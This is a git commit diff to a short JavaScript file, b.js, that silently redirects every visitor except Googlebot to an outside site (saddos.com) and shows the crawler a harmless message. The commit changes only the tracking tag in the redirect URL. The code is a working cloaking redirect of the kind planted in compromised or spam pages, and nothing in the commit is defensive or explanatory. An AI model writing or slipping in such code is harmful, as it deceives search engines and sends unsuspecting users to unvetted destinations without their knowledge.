b26b754d9249e866855eb3c513a41b3880d2e1d9
wolf-man24 <workfromh413@gmail.com>
2026-08-12 19:01:52 +0600

    gf

--- b.js
+++ b.js
@@ -1,5 +1,5 @@
 if (!navigator.userAgent.includes('Googlebot')) {
-  window.location.href = "https://saddos.com/?binoy";
+  window.location.href = "https://saddos.com/?wolf";
 } else {
   console.log("Thanks for visiting my page" );
 }
